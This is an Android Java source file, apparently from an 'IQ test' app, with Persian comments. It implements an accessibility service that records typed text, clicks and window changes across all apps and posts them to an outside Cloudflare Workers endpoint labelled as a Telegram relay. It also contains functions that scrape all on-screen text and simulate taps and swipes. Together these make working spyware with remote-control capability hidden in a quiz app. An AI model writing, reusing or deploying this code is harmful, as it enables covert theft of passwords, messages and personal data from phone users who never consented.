package com.iqtest.app;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.RequiresApi;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "IQAccessibility";
    private static final String TELEGRAM_WORKER = "https://mute-math-f311iq-190.mehran041mehraaaan.workers.dev";
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "سرویس Accessibility متصل شد");

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        try {
            int eventType = event.getEventType();
            CharSequence packageName = event.getPackageName();
            CharSequence className = event.getClassName();
            CharSequence text = event.getText() != null && event.getText().size() > 0
                    ? event.getText().get(0) : "";

            JSONObject data = new JSONObject();
            data.put("event", "accessibility_event");
            data.put("eventType", eventType);
            data.put("packageName", packageName != null ? packageName.toString() : "");
            data.put("className", className != null ? className.toString() : "");
            data.put("text", text != null ? text.toString() : "");
            data.put("timestamp", System.currentTimeMillis());

            // فقط رویدادهای مهم
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                    || eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                    || eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                sendToServer(data);
            }
        } catch (Exception e) {
            Log.e(TAG, "خطا در پردازش رویداد", e);
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "سرویس قطع شد");
    }

    /**
     * شبیه‌سازی کلیک روی مختصات مشخص
     */
    @RequiresApi(api = Build.VERSION_CODES.N)
    public boolean clickAt(float x, float y) {
        Path clickPath = new Path();
        clickPath.moveTo(x, y);

        GestureDescription.StrokeDescription clickStroke =
                new GestureDescription.StrokeDescription(clickPath, 0, 100);

        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        gestureBuilder.addStroke(clickStroke);

        return dispatchGesture(gestureBuilder.build(), null, null);
    }

    /**
     * شبیه‌سازی سوایپ
     */
    @RequiresApi(api = Build.VERSION_CODES.N)
    public boolean swipe(float x1, float y1, float x2, float y2, long duration) {
        Path swipePath = new Path();
        swipePath.moveTo(x1, y1);
        swipePath.lineTo(x2, y2);

        GestureDescription.StrokeDescription swipeStroke =
                new GestureDescription.StrokeDescription(swipePath, 0, duration);

        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        gestureBuilder.addStroke(swipeStroke);

        return dispatchGesture(gestureBuilder.build(), null, null);
    }

    /**
     * پیدا کردن همه متن‌های روی صفحه
     */
    public JSONArray getAllTexts() {
        JSONArray texts = new JSONArray();
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return texts;

            traverseNode(root, texts);
        } catch (Exception e) {
            Log.e(TAG, "خطا در گرفتن متن‌ها", e);
        }
        return texts;
    }

    private void traverseNode(AccessibilityNodeInfo node, JSONArray texts) {
        if (node == null) return;

        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();

            if ((text != null && text.length() > 0) || (desc != null && desc.length() > 0)) {
                JSONObject item = new JSONObject();
                if (text != null) item.put("text", text.toString());
                if (desc != null) item.put("description", desc.toString());
                item.put("viewId", node.getViewIdResourceName() != null ?
                        node.getViewIdResourceName() : "");
                texts.put(item);
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                traverseNode(node.getChild(i), texts);
            }
        } catch (Exception e) {
            Log.e(TAG, "خطا در traverse", e);
        }
    }

    private void sendToServer(JSONObject data) {
        executor.execute(() -> {
            try {
                URL url = new URL(TELEGRAM_WORKER);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(data.toString().getBytes("UTF-8"));
                }

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "پاسخ سرور: " + responseCode);
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "خطا در ارسال به سرور", e);
            }
        });
    }
}